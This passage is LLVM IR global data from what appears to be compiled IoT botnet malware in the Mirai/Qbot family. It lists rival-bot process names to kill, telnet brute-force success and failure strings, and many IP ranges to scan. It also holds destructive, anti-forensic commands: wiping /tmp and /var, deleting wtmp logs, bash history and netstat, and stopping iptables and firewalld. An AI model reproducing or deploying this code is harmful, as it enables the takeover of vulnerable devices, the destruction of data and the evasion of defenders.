@.str.288 = private unnamed_addr constant [10 x i8] c"hackmysh4\00", align 1
@.str.289 = private unnamed_addr constant [10 x i8] c"hackmyx86\00", align 1
@.str.290 = private unnamed_addr constant [12 x i8] c"hackmyarmv5\00", align 1
@.str.291 = private unnamed_addr constant [14 x i8] c"hackmyarmv4tl\00", align 1
@.str.292 = private unnamed_addr constant [12 x i8] c"hackmyarmv4\00", align 1
@.str.293 = private unnamed_addr constant [12 x i8] c"hackmyarmv6\00", align 1
@.str.294 = private unnamed_addr constant [11 x i8] c"hackmyi686\00", align 1
@.str.295 = private unnamed_addr constant [14 x i8] c"hackmypowerpc\00", align 1
@.str.296 = private unnamed_addr constant [19 x i8] c"hackmypowerpc440fp\00", align 1
@.str.297 = private unnamed_addr constant [11 x i8] c"hackmyi586\00", align 1
@.str.298 = private unnamed_addr constant [11 x i8] c"hackmym68k\00", align 1
@.str.299 = private unnamed_addr constant [12 x i8] c"hackmysparc\00", align 1
@.str.300 = private unnamed_addr constant [13 x i8] c"hackmyx86_64\00", align 1
@.str.301 = private unnamed_addr constant [3 x i8] c"b1\00", align 1
@.str.302 = private unnamed_addr constant [4 x i8] c"b10\00", align 1
@.str.303 = private unnamed_addr constant [4 x i8] c"b11\00", align 1
@.str.304 = private unnamed_addr constant [4 x i8] c"b12\00", align 1
@.str.305 = private unnamed_addr constant [4 x i8] c"b13\00", align 1
@.str.306 = private unnamed_addr constant [4 x i8] c"b14\00", align 1
@.str.307 = private unnamed_addr constant [4 x i8] c"b15\00", align 1
@.str.308 = private unnamed_addr constant [4 x i8] c"b16\00", align 1
@.str.309 = private unnamed_addr constant [4 x i8] c"b17\00", align 1
@.str.310 = private unnamed_addr constant [4 x i8] c"b18\00", align 1
@.str.311 = private unnamed_addr constant [4 x i8] c"b19\00", align 1
@.str.312 = private unnamed_addr constant [4 x i8] c"b20\00", align 1
@.str.313 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.314 = private unnamed_addr constant [8 x i8] c"kmymips\00", align 1
@.str.315 = private unnamed_addr constant [10 x i8] c"kmymips64\00", align 1
@.str.316 = private unnamed_addr constant [10 x i8] c"kmymipsel\00", align 1
@.str.317 = private unnamed_addr constant [9 x i8] c"kmysh2eb\00", align 1
@.str.318 = private unnamed_addr constant [10 x i8] c"kmysh2elf\00", align 1
@.str.319 = private unnamed_addr constant [7 x i8] c"kmysh4\00", align 1
@.str.320 = private unnamed_addr constant [7 x i8] c"kmyx86\00", align 1
@.str.321 = private unnamed_addr constant [9 x i8] c"kmyarmv5\00", align 1
@.str.322 = private unnamed_addr constant [11 x i8] c"kmyarmv4tl\00", align 1
@.str.323 = private unnamed_addr constant [9 x i8] c"kmyarmv4\00", align 1
@.str.324 = private unnamed_addr constant [9 x i8] c"kmyarmv6\00", align 1
@.str.325 = private unnamed_addr constant [8 x i8] c"kmyi686\00", align 1
@.str.326 = private unnamed_addr constant [11 x i8] c"kmypowerpc\00", align 1
@.str.327 = private unnamed_addr constant [16 x i8] c"kmypowerpc440fp\00", align 1
@.str.328 = private unnamed_addr constant [8 x i8] c"kmyi586\00", align 1
@.str.329 = private unnamed_addr constant [8 x i8] c"kmym68k\00", align 1
@.str.330 = private unnamed_addr constant [9 x i8] c"kmysparc\00", align 1
@.str.331 = private unnamed_addr constant [8 x i8] c"lolmips\00", align 1
@.str.332 = private unnamed_addr constant [10 x i8] c"lolmips64\00", align 1
@.str.333 = private unnamed_addr constant [9 x i8] c"lolsh2eb\00", align 1
@.str.334 = private unnamed_addr constant [10 x i8] c"lolsh2elf\00", align 1
@.str.335 = private unnamed_addr constant [7 x i8] c"lolsh4\00", align 1
@.str.336 = private unnamed_addr constant [7 x i8] c"lolx86\00", align 1
@.str.337 = private unnamed_addr constant [9 x i8] c"lolarmv5\00", align 1
@.str.338 = private unnamed_addr constant [11 x i8] c"lolarmv4tl\00", align 1
@.str.339 = private unnamed_addr constant [9 x i8] c"lolarmv4\00", align 1
@.str.340 = private unnamed_addr constant [9 x i8] c"lolarmv6\00", align 1
@.str.341 = private unnamed_addr constant [8 x i8] c"loli686\00", align 1
@.str.342 = private unnamed_addr constant [12 x i8] c"mirai.linux\00", align 1
@.str.343 = private unnamed_addr constant [11 x i8] c"mirai.mips\00", align 1
@.str.344 = private unnamed_addr constant [11 x i8] c"lolpowerpc\00", align 1
@.str.345 = private unnamed_addr constant [16 x i8] c"lolpowerpc440fp\00", align 1
@.str.346 = private unnamed_addr constant [8 x i8] c"loli586\00", align 1
@.str.347 = private unnamed_addr constant [8 x i8] c"lolm68k\00", align 1
@.str.348 = private unnamed_addr constant [9 x i8] c"lolsparc\00", align 1
@.str.349 = private unnamed_addr constant [8 x i8] c"telmips\00", align 1
@.str.350 = private unnamed_addr constant [10 x i8] c"telmips64\00", align 1
@.str.351 = private unnamed_addr constant [10 x i8] c"telmipsel\00", align 1
@.str.352 = private unnamed_addr constant [9 x i8] c"telsh2eb\00", align 1
@.str.353 = private unnamed_addr constant [10 x i8] c"telsh2elf\00", align 1
@.str.354 = private unnamed_addr constant [7 x i8] c"telsh4\00", align 1
@.str.355 = private unnamed_addr constant [7 x i8] c"telx86\00", align 1
@.str.356 = private unnamed_addr constant [9 x i8] c"telarmv5\00", align 1
@.str.357 = private unnamed_addr constant [11 x i8] c"telarmv4tl\00", align 1
@.str.358 = private unnamed_addr constant [9 x i8] c"telarmv4\00", align 1
@.str.359 = private unnamed_addr constant [9 x i8] c"telarmv6\00", align 1
@.str.360 = private unnamed_addr constant [8 x i8] c"teli686\00", align 1
@.str.361 = private unnamed_addr constant [11 x i8] c"telpowerpc\00", align 1
@.str.362 = private unnamed_addr constant [16 x i8] c"telpowerpc440fp\00", align 1
@.str.363 = private unnamed_addr constant [8 x i8] c"teli586\00", align 1
@.str.364 = private unnamed_addr constant [8 x i8] c"telm68k\00", align 1
@.str.365 = private unnamed_addr constant [9 x i8] c"telsparc\00", align 1
@.str.366 = private unnamed_addr constant [10 x i8] c"telx86_64\00", align 1
@.str.367 = private unnamed_addr constant [12 x i8] c"TwoFacemips\00", align 1
@.str.368 = private unnamed_addr constant [14 x i8] c"TwoFacemips64\00", align 1
@.str.369 = private unnamed_addr constant [14 x i8] c"TwoFacemipsel\00", align 1
@.str.370 = private unnamed_addr constant [13 x i8] c"TwoFacesh2eb\00", align 1
@.str.371 = private unnamed_addr constant [14 x i8] c"TwoFacesh2elf\00", align 1
@.str.372 = private unnamed_addr constant [11 x i8] c"TwoFacesh4\00", align 1
@.str.373 = private unnamed_addr constant [11 x i8] c"TwoFacex86\00", align 1
@.str.374 = private unnamed_addr constant [13 x i8] c"TwoFacearmv5\00", align 1
@.str.375 = private unnamed_addr constant [15 x i8] c"TwoFacearmv4tl\00", align 1
@.str.376 = private unnamed_addr constant [13 x i8] c"TwoFacearmv4\00", align 1
@.str.377 = private unnamed_addr constant [13 x i8] c"TwoFacearmv6\00", align 1
@.str.378 = private unnamed_addr constant [12 x i8] c"TwoFacei686\00", align 1
@.str.379 = private unnamed_addr constant [15 x i8] c"TwoFacepowerpc\00", align 1
@.str.380 = private unnamed_addr constant [20 x i8] c"TwoFacepowerpc440fp\00", align 1
@.str.381 = private unnamed_addr constant [12 x i8] c"TwoFacei586\00", align 1
@.str.382 = private unnamed_addr constant [12 x i8] c"TwoFacem68k\00", align 1
@.str.383 = private unnamed_addr constant [13 x i8] c"TwoFacesparc\00", align 1
@.str.384 = private unnamed_addr constant [14 x i8] c"TwoFacex86_64\00", align 1
@.str.385 = private unnamed_addr constant [5 x i8] c"xxb1\00", align 1
@.str.386 = private unnamed_addr constant [5 x i8] c"xxb2\00", align 1
@.str.387 = private unnamed_addr constant [5 x i8] c"xxb3\00", align 1
@.str.388 = private unnamed_addr constant [5 x i8] c"xxb4\00", align 1
@.str.389 = private unnamed_addr constant [5 x i8] c"xxb5\00", align 1
@.str.390 = private unnamed_addr constant [5 x i8] c"xxb6\00", align 1
@.str.391 = private unnamed_addr constant [5 x i8] c"xxb7\00", align 1
@.str.392 = private unnamed_addr constant [5 x i8] c"xxb8\00", align 1
@.str.393 = private unnamed_addr constant [5 x i8] c"xxb9\00", align 1
@.str.394 = private unnamed_addr constant [6 x i8] c"xxb10\00", align 1
@.str.395 = private unnamed_addr constant [6 x i8] c"xxb11\00", align 1
@.str.396 = private unnamed_addr constant [6 x i8] c"xxb12\00", align 1
@.str.397 = private unnamed_addr constant [6 x i8] c"xxb13\00", align 1
@.str.398 = private unnamed_addr constant [6 x i8] c"xxb14\00", align 1
@.str.399 = private unnamed_addr constant [6 x i8] c"xxb15\00", align 1
@.str.400 = private unnamed_addr constant [6 x i8] c"xxb16\00", align 1
@.str.401 = private unnamed_addr constant [6 x i8] c"xxb17\00", align 1
@.str.402 = private unnamed_addr constant [6 x i8] c"xxb18\00", align 1
@.str.403 = private unnamed_addr constant [6 x i8] c"xxb19\00", align 1
@.str.404 = private unnamed_addr constant [6 x i8] c"xxb20\00", align 1
@.str.405 = private unnamed_addr constant [3 x i8] c"bb\00", align 1
@.str.406 = private unnamed_addr constant [11 x i8] c"busybotnet\00", align 1
@.str.407 = private unnamed_addr constant [5 x i8] c"pppd\00", align 1
@.str.408 = private unnamed_addr constant [6 x i8] c"pppoe\00", align 1
@.str.409 = private unnamed_addr constant [5 x i8] c"wput\00", align 1
@.str.410 = private unnamed_addr constant [3 x i8] c"B1\00", align 1
@.str.411 = private unnamed_addr constant [3 x i8] c"B2\00", align 1
@.str.412 = private unnamed_addr constant [3 x i8] c"B3\00", align 1
@.str.413 = private unnamed_addr constant [3 x i8] c"B4\00", align 1
@.str.414 = private unnamed_addr constant [3 x i8] c"B5\00", align 1
@.str.415 = private unnamed_addr constant [3 x i8] c"B6\00", align 1
@.str.416 = private unnamed_addr constant [3 x i8] c"B7\00", align 1
@.str.417 = private unnamed_addr constant [3 x i8] c"B8\00", align 1
@.str.418 = private unnamed_addr constant [3 x i8] c"B9\00", align 1
@.str.419 = private unnamed_addr constant [4 x i8] c"B10\00", align 1
@.str.420 = private unnamed_addr constant [4 x i8] c"B11\00", align 1
@.str.421 = private unnamed_addr constant [4 x i8] c"B12\00", align 1
@.str.422 = private unnamed_addr constant [4 x i8] c"B13\00", align 1
@.str.423 = private unnamed_addr constant [4 x i8] c"B14\00", align 1
@.str.424 = private unnamed_addr constant [4 x i8] c"B15\00", align 1
@.str.425 = private unnamed_addr constant [4 x i8] c"B16\00", align 1
@.str.426 = private unnamed_addr constant [4 x i8] c"B17\00", align 1
@.str.427 = private unnamed_addr constant [4 x i8] c"B18\00", align 1
@.str.428 = private unnamed_addr constant [4 x i8] c"B20\00", align 1
@.str.429 = private unnamed_addr constant [4 x i8] c"DVR\00", align 1
@.str.430 = private unnamed_addr constant [7 x i8] c"*mirai\00", align 1
@.str.431 = private unnamed_addr constant [8 x i8] c"*.mirai\00", align 1
@.str.432 = private unnamed_addr constant [7 x i8] c"cunty*\00", align 1
@.str.433 = private unnamed_addr constant [5 x i8] c"IoT*\00", align 1
@.str.434 = private unnamed_addr constant [3 x i8] c"pc\00", align 1
@.str.435 = private unnamed_addr constant [11 x i8] c"orion.mips\00", align 1
@.str.436 = private unnamed_addr constant [11 x i8] c"okiru.mips\00", align 1
@.str.437 = private unnamed_addr constant [15 x i8] c"nightcore.mips\00", align 1
@.str.438 = private unnamed_addr constant [3 x i8] c"ar\00", align 1
@.str.439 = private unnamed_addr constant [9 x i8] c"lsp.modz\00", align 1
@.str.440 = private unnamed_addr constant [7 x i8] c"mipsxd\00", align 1
@.str.441 = private unnamed_addr constant [9 x i8] c"die.mips\00", align 1
@.str.442 = private unnamed_addr constant [13 x i8] c"dupessh*mips\00", align 1
@.str.443 = private unnamed_addr constant [7 x i8] c"*.mips\00", align 1
@.str.444 = private unnamed_addr constant [4 x i8] c"pps\00", align 1
@.str.445 = private unnamed_addr constant [5 x i8] c"sh4*\00", align 1
@.str.446 = private unnamed_addr constant [6 x i8] c"wget*\00", align 1
@.str.447 = private unnamed_addr constant [5 x i8] c"ssh*\00", align 1
@.str.448 = private unnamed_addr constant [7 x i8] c"vulcan\00", align 1
@.str.449 = private unnamed_addr constant [10 x i8] c"jennifer*\00", align 1
@.str.450 = private unnamed_addr constant [7 x i8] c"okiru*\00", align 1
@.str.451 = private unnamed_addr constant [8 x i8] c"vulcana\00", align 1
@.str.452 = private unnamed_addr constant [8 x i8] c"vulcanb\00", align 1
@.str.453 = private unnamed_addr constant [8 x i8] c"vulcand\00", align 1
@.str.454 = private unnamed_addr constant [8 x i8] c"vulcane\00", align 1
@.str.455 = private unnamed_addr constant [8 x i8] c"vulcanx\00", align 1
@.str.456 = private unnamed_addr constant [8 x i8] c"vulcany\00", align 1
@.str.457 = private unnamed_addr constant [8 x i8] c"vulcanz\00", align 1
@.str.458 = private unnamed_addr constant [8 x i8] c"vulcang\00", align 1
@.str.459 = private unnamed_addr constant [8 x i8] c"apache2\00", align 1
@.str.460 = private unnamed_addr constant [8 x i8] c"telnetd\00", align 1
@Temp_Directorys = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.461, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.463, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.464, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.465, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.466, i32 0, i32 0), i8* null], align 16
@.str.461 = private unnamed_addr constant [7 x i8] c"/tmp/*\00", align 1
@.str.462 = private unnamed_addr constant [12 x i8] c"/root/tmp/*\00", align 1
@.str.463 = private unnamed_addr constant [8 x i8] c"/temp/*\00", align 1
@.str.464 = private unnamed_addr constant [7 x i8] c"/var/*\00", align 1
@.str.465 = private unnamed_addr constant [11 x i8] c"/var/run/*\00", align 1
@.str.466 = private unnamed_addr constant [11 x i8] c"/var/tmp/*\00", align 1
@advances = global [13 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.471, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.472, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.473, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.474, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.475, i32 0, i32 0), i8* null], align 16
@.str.467 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.468 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.469 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.470 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.471 = private unnamed_addr constant [8 x i8] c"mdm9625\00", align 1
@.str.472 = private unnamed_addr constant [5 x i8] c"F600\00", align 1
@.str.473 = private unnamed_addr constant [5 x i8] c"F660\00", align 1
@.str.474 = private unnamed_addr constant [5 x i8] c"F609\00", align 1
@.str.475 = private unnamed_addr constant [4 x i8] c"BCM\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.477, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.478, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.479, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.480, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.481, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.482, i32 0, i32 0), i8* null], align 16
@.str.476 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.477 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.478 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.479 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.480 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.481 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.482 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [12 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.483, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.484, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.485, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.471, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.472, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.473, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.474, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.475, i32 0, i32 0), i8* null], align 16
@.str.483 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.484 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.485 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.477, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.478, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.479, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.480, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.481, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.482, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.483, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.484, i32 0, i32 0), i8* null], align 16
@pids = common global i32* null, align 8
@ipState = global [5 x i8] zeroinitializer, align 1
@telnettestrange = global i32 1, align 4
@telnetrange = global i32 1, align 4
@miraitestrange = global i32 1, align 4
@mirairange = global i32 1, align 4
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@miraiPid = common global i32 0, align 4
@Phonepid = common global i32 0, align 4
@testmiraiPid = common global i32 0, align 4
@testtelnetPid = common global i32 0, align 4
@bcmPid = common global i32 0, align 4
@.str.1 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.7 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.8 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.9 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.10 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.11 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.12 = private unnamed_addr constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00", align 1
@.str.13 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.970 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.486 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.487 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.488 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.489 = private unnamed_addr constant [12 x i8] c"37.11.%d.%d\00", align 1
@.str.490 = private unnamed_addr constant [14 x i8] c"146.158.%d.%d\00", align 1
@.str.491 = private unnamed_addr constant [12 x i8] c"185.4.%d.%d\00", align 1
@.str.492 = private unnamed_addr constant [13 x i8] c"188.76.%d.%d\00", align 1
@.str.493 = private unnamed_addr constant [13 x i8] c"188.77.%d.%d\00", align 1
@.str.494 = private unnamed_addr constant [13 x i8] c"188.78.%d.%d\00", align 1
@.str.495 = private unnamed_addr constant [13 x i8] c"188.79.%d.%d\00", align 1
@.str.496 = private unnamed_addr constant [14 x i8] c"212.106.%d.%d\00", align 1
@.str.497 = private unnamed_addr constant [12 x i8] c"212.9.%d.%d\00", align 1
@.str.498 = private unnamed_addr constant [14 x i8] c"213.179.%d.%d\00", align 1
@.str.499 = private unnamed_addr constant [13 x i8] c"37.132.%d.%d\00", align 1
@.str.500 = private unnamed_addr constant [13 x i8] c"37.133.%d.%d\00", align 1
@.str.501 = private unnamed_addr constant [13 x i8] c"37.134.%d.%d\00", align 1
@.str.502 = private unnamed_addr constant [13 x i8] c"37.135.%d.%d\00", align 1
@.str.503 = private unnamed_addr constant [12 x i8] c"37.14.%d.%d\00", align 1
@.str.504 = private unnamed_addr constant [12 x i8] c"37.15.%d.%d\00", align 1
@.str.505 = private unnamed_addr constant [12 x i8] c"37.35.%d.%d\00", align 1
@.str.506 = private unnamed_addr constant [12 x i8] c"37.97.%d.%d\00", align 1
@.str.507 = private unnamed_addr constant [12 x i8] c"62.14.%d.%d\00", align 1
@.str.508 = private unnamed_addr constant [13 x i8] c"87.216.%d.%d\00", align 1
@.str.509 = private unnamed_addr constant [13 x i8] c"87.217.%d.%d\00", align 1
@.str.510 = private unnamed_addr constant [13 x i8] c"87.218.%d.%d\00", align 1
@.str.511 = private unnamed_addr constant [13 x i8] c"87.219.%d.%d\00", align 1
@.str.512 = private unnamed_addr constant [13 x i8] c"87.220.%d.%d\00", align 1
@.str.513 = private unnamed_addr constant [13 x i8] c"87.221.%d.%d\00", align 1
@.str.514 = private unnamed_addr constant [13 x i8] c"87.222.%d.%d\00", align 1
@.str.515 = private unnamed_addr constant [13 x i8] c"87.223.%d.%d\00", align 1
@.str.516 = private unnamed_addr constant [12 x i8] c"90.94.%d.%d\00", align 1
@.str.517 = private unnamed_addr constant [13 x i8] c"92.191.%d.%d\00", align 1
@.str.518 = private unnamed_addr constant [12 x i8] c"95.16.%d.%d\00", align 1
@.str.519 = private unnamed_addr constant [12 x i8] c"95.17.%d.%d\00", align 1
@.str.520 = private unnamed_addr constant [12 x i8] c"95.18.%d.%d\00", align 1
@.str.521 = private unnamed_addr constant [12 x i8] c"95.19.%d.%d\00", align 1
@.str.522 = private unnamed_addr constant [12 x i8] c"95.20.%d.%d\00", align 1
@.str.523 = private unnamed_addr constant [12 x i8] c"95.21.%d.%d\00", align 1
@.str.524 = private unnamed_addr constant [12 x i8] c"95.22.%d.%d\00", align 1
@.str.525 = private unnamed_addr constant [12 x i8] c"95.23.%d.%d\00", align 1
@.str.526 = private unnamed_addr constant [14 x i8] c"119.157.%d.%d\00", align 1
@.str.527 = private unnamed_addr constant [14 x i8] c"119.150.%d.%d\00", align 1
@.str.528 = private unnamed_addr constant [14 x i8] c"119.151.%d.%d\00", align 1
@.str.529 = private unnamed_addr constant [14 x i8] c"119.152.%d.%d\00", align 1
@.str.530 = private unnamed_addr constant [14 x i8] c"119.153.%d.%d\00", align 1
@.str.531 = private unnamed_addr constant [14 x i8] c"119.154.%d.%d\00", align 1
@.str.532 = private unnamed_addr constant [14 x i8] c"119.155.%d.%d\00", align 1
@.str.533 = private unnamed_addr constant [14 x i8] c"119.156.%d.%d\00", align 1
@.str.534 = private unnamed_addr constant [14 x i8] c"119.158.%d.%d\00", align 1
@.str.535 = private unnamed_addr constant [14 x i8] c"119.159.%d.%d\00", align 1
@.str.536 = private unnamed_addr constant [13 x i8] c"191.24.%d.%d\00", align 1
@.str.537 = private unnamed_addr constant [14 x i8] c"187.119.%d.%d\00", align 1
@.str.538 = private unnamed_addr constant [14 x i8] c"177.215.%d.%d\00", align 1
@.str.539 = private unnamed_addr constant [14 x i8] c"152.241.%d.%d\00", align 1
@.str.540 = private unnamed_addr constant [14 x i8] c"182.185.%d.%d\00", align 1
@.str.541 = private unnamed_addr constant [13 x i8] c"179.80.%d.%d\00", align 1
@.str.542 = private unnamed_addr constant [13 x i8] c"179.81.%d.%d\00", align 1
@.str.543 = private unnamed_addr constant [13 x i8] c"179.82.%d.%d\00", align 1
@.str.544 = private unnamed_addr constant [13 x i8] c"179.83.%d.%d\00", align 1
@.str.545 = private unnamed_addr constant [13 x i8] c"179.84.%d.%d\00", align 1
@.str.546 = private unnamed_addr constant [13 x i8] c"179.86.%d.%d\00", align 1
@.str.547 = private unnamed_addr constant [13 x i8] c"179.87.%d.%d\00", align 1
@.str.548 = private unnamed_addr constant [13 x i8] c"179.88.%d.%d\00", align 1
@.str.549 = private unnamed_addr constant [13 x i8] c"179.89.%d.%d\00", align 1
@.str.550 = private unnamed_addr constant [13 x i8] c"179.90.%d.%d\00", align 1
@.str.551 = private unnamed_addr constant [13 x i8] c"179.91.%d.%d\00", align 1
@.str.552 = private unnamed_addr constant [13 x i8] c"179.92.%d.%d\00", align 1
@.str.553 = private unnamed_addr constant [13 x i8] c"179.93.%d.%d\00", align 1
@.str.554 = private unnamed_addr constant [13 x i8] c"179.94.%d.%d\00", align 1
@.str.555 = private unnamed_addr constant [13 x i8] c"179.95.%d.%d\00", align 1
@.str.556 = private unnamed_addr constant [13 x i8] c"179.96.%d.%d\00", align 1
@.str.557 = private unnamed_addr constant [13 x i8] c"179.97.%d.%d\00", align 1
@.str.558 = private unnamed_addr constant [13 x i8] c"179.98.%d.%d\00", align 1
@.str.559 = private unnamed_addr constant [13 x i8] c"179.99.%d.%d\00", align 1
@.str.560 = private unnamed_addr constant [14 x i8] c"152.240.%d.%d\00", align 1
@.str.561 = private unnamed_addr constant [14 x i8] c"152.242.%d.%d\00", align 1
@.str.562 = private unnamed_addr constant [14 x i8] c"152.243.%d.%d\00", align 1
@.str.563 = private unnamed_addr constant [14 x i8] c"152.244.%d.%d\00", align 1
@.str.564 = private unnamed_addr constant [14 x i8] c"152.245.%d.%d\00", align 1
@.str.565 = private unnamed_addr constant [14 x i8] c"152.246.%d.%d\00", align 1
@.str.566 = private unnamed_addr constant [14 x i8] c"152.247.%d.%d\00", align 1
@.str.567 = private unnamed_addr constant [14 x i8] c"152.248.%d.%d\00", align 1
@.str.568 = private unnamed_addr constant [14 x i8] c"152.249.%d.%d\00", align 1
@.str.569 = private unnamed_addr constant [14 x i8] c"182.189.%d.%d\00", align 1
@.str.570 = private unnamed_addr constant [14 x i8] c"182.190.%d.%d\00", align 1
@.str.571 = private unnamed_addr constant [14 x i8] c"182.191.%d.%d\00", align 1
@.str.572 = private unnamed_addr constant [14 x i8] c"182.188.%d.%d\00", align 1
@.str.573 = private unnamed_addr constant [14 x i8] c"182.187.%d.%d\00", align 1
@.str.574 = private unnamed_addr constant [14 x i8] c"182.186.%d.%d\00", align 1
@.str.575 = private unnamed_addr constant [14 x i8] c"182.184.%d.%d\00", align 1
@.str.576 = private unnamed_addr constant [14 x i8] c"179.100.%d.%d\00", align 1
@.str.577 = private unnamed_addr constant [14 x i8] c"179.101.%d.%d\00", align 1
@.str.578 = private unnamed_addr constant [14 x i8] c"179.102.%d.%d\00", align 1
@.str.579 = private unnamed_addr constant [14 x i8] c"179.103.%d.%d\00", align 1
@.str.580 = private unnamed_addr constant [14 x i8] c"179.110.%d.%d\00", align 1
@.str.581 = private unnamed_addr constant [14 x i8] c"179.111.%d.%d\00", align 1
@.str.582 = private unnamed_addr constant [14 x i8] c"179.112.%d.%d\00", align 1
@.str.583 = private unnamed_addr constant [14 x i8] c"179.113.%d.%d\00", align 1
@.str.584 = private unnamed_addr constant [14 x i8] c"179.114.%d.%d\00", align 1
@.str.585 = private unnamed_addr constant [14 x i8] c"179.115.%d.%d\00", align 1
@.str.586 = private unnamed_addr constant [14 x i8] c"179.116.%d.%d\00", align 1
@.str.587 = private unnamed_addr constant [14 x i8] c"179.117.%d.%d\00", align 1
@.str.588 = private unnamed_addr constant [14 x i8] c"191.193.%d.%d\00", align 1
@.str.589 = private unnamed_addr constant [14 x i8] c"191.194.%d.%d\00", align 1
@.str.590 = private unnamed_addr constant [14 x i8] c"191.195.%d.%d\00", align 1
@.str.591 = private unnamed_addr constant [14 x i8] c"191.196.%d.%d\00", align 1
